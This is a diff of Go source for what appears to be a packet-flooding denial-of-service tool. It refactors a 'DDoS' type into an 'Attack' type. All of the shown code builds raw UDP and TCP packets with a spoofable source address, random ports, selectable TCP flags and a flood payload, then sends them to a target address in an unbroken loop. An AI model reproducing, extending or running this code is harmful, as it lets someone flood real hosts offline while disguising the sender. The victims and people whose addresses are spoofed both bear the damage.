@@ -14,9 +14,15 @@ import (
 
 var AttackSwitch bool
 
-func rawSocket(proto int) net.PacketConn {
-	sock, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, proto)
+func convInt(str string) int {
+	conv, _ := strconv.Atoi(fmt.Sprint(str))
+	return conv
+}
+
+func rawSocket(rawProtocol int) net.PacketConn {
+	sock, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, rawProtocol)
 	syscall.SetsockoptInt(sock, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
+	syscall.SetsockoptInt(sock, syscall.IPPROTO_IP, syscall.SO_REUSEADDR, 1)
 	conn, _ := net.FilePacketConn(os.NewFile(uintptr(sock), fmt.Sprint(sock)))
 	return conn
 }
@@ -30,61 +36,55 @@ func setupOpt() (gopacket.SerializeBuffer, *gopacket.SerializeOptions) {
 	return buffer, opts
 }
 
-func convInt(str string) int {
-	conv, _ := strconv.Atoi(fmt.Sprint(str))
-	return conv
-}
-
-func (d *DDoS) setupUDP(src, dst *net.UDPAddr) []byte {
-	sBuffer, sOpt := setupOpt()
+func setupIPv4(srcv4, dstv4 net.IP, protov4 layers.IPProtocol) *layers.IPv4 {
 	ipv4 := &layers.IPv4{
-		SrcIP:    src.IP.To4(),
-		DstIP:    dst.IP.To4(),
+		SrcIP:    srcv4,
+		DstIP:    dstv4,
 		Version:  4,
 		TTL:      255,
-		Protocol: layers.IPProtocolUDP,
+		Protocol: protov4,
 	}
+	return ipv4
+}
+
+func (a *Attack) setupUDP(udpSrc, udpDst *net.UDPAddr) []byte {
+	sBuffer, sOpt := setupOpt()
+	udpv4 := setupIPv4(udpSrc.IP.To4(), udpDst.IP.To4(), layers.IPProtocolUDP)
 	udpLayers := &layers.UDP{
-		SrcPort: layers.UDPPort(src.Port),
-		DstPort: layers.UDPPort(dst.Port),
+		SrcPort: layers.UDPPort(udpSrc.Port),
+		DstPort: layers.UDPPort(udpDst.Port),
 	}
-	udpLayers.SetNetworkLayerForChecksum(ipv4)
-	gopacket.SerializeLayers(sBuffer, *sOpt, ipv4, udpLayers, gopacket.Payload(d.ddosPayload))
+	udpLayers.SetNetworkLayerForChecksum(udpv4)
+	gopacket.SerializeLayers(sBuffer, *sOpt, udpv4, udpLayers, gopacket.Payload(a.ddosPayload))
 	return sBuffer.Bytes()
 }
 
-func (d *DDoS) setupTCP(src, dst *net.TCPAddr) []byte {
+func (a *Attack) setupTCP(tcpSrc, tcpDst *net.TCPAddr) []byte {
 	sBuffer, sOpt := setupOpt()
-	ipv4 := &layers.IPv4{
-		SrcIP:    src.IP.To4(),
-		DstIP:    dst.IP.To4(),
-		Version:  4,
-		TTL:      255,
-		Protocol: layers.IPProtocolTCP,
-	}
+	tcpv4 := setupIPv4(tcpSrc.IP.To4(), tcpDst.IP.To4(), layers.IPProtocolTCP)
 	tcpLayers := &layers.TCP{
-		SrcPort: layers.TCPPort(src.Port),
-		DstPort: layers.TCPPort(dst.Port),
-		SYN:     d.synFlag,
-		ACK:     d.ackFlag,
-		RST:     d.rstFlag,
-		PSH:     d.pshFlag,
-		FIN:     d.finFlag,
-		URG:     d.urgFlag,
+		SrcPort: layers.TCPPort(tcpSrc.Port),
+		DstPort: layers.TCPPort(tcpDst.Port),
+		SYN:     a.synFlag,
+		ACK:     a.ackFlag,
+		RST:     a.rstFlag,
+		PSH:     a.pshFlag,
+		FIN:     a.finFlag,
+		URG:     a.urgFlag,
 	}
-	tcpLayers.SetNetworkLayerForChecksum(ipv4)
-	gopacket.SerializeLayers(sBuffer, *sOpt, ipv4, tcpLayers, gopacket.Payload(d.ddosPayload))
+	tcpLayers.SetNetworkLayerForChecksum(tcpv4)
+	gopacket.SerializeLayers(sBuffer, *sOpt, tcpv4, tcpLayers, gopacket.Payload(a.ddosPayload))
 	return sBuffer.Bytes()
 }
 
-func (d *DDoS) udpPacket() {
+func (a *Attack) udpPacket() {
 	dst := &net.UDPAddr{
-		IP:   net.ParseIP(d.dstAddr),
-		Port: convInt(d.dstPort),
+		IP:   net.ParseIP(a.dstAddr),
+		Port: convInt(a.dstPort),
 	}
 	conn := rawSocket(syscall.IPPROTO_UDP)
 	for {
-		udp := d.setupUDP(&net.UDPAddr{IP: net.ParseIP(d.srcAddr), Port: rand.Intn(65535)}, dst)
+		udp := a.setupUDP(&net.UDPAddr{IP: net.ParseIP(a.srcAddr), Port: rand.Intn(65535)}, dst)
 		conn.WriteTo(udp, &net.IPAddr{IP: dst.IP})
 		if AttackSwitch {
 			break
@@ -92,14 +92,14 @@ func (d *DDoS) udpPacket() {
 	}
 }
 
-func (d *DDoS) tcpPacket() {
+func (a *Attack) tcpPacket() {
 	dst := &net.TCPAddr{
-		IP:   net.ParseIP(d.dstAddr),
-		Port: convInt(d.dstPort),
+		IP:   net.ParseIP(a.dstAddr),
+		Port: convInt(a.dstPort),
 	}
 	conn := rawSocket(syscall.IPPROTO_TCP)
 	for {
-		tcp := d.setupTCP(&net.TCPAddr{IP: net.ParseIP(d.srcAddr), Port: rand.Intn(65535)}, dst)
+		tcp := a.setupTCP(&net.TCPAddr{IP: net.ParseIP(a.srcAddr), Port: rand.Intn(65535)}, dst)
 		conn.WriteTo(tcp, &net.IPAddr{IP: dst.IP})
 		if AttackSwitch {
 			break
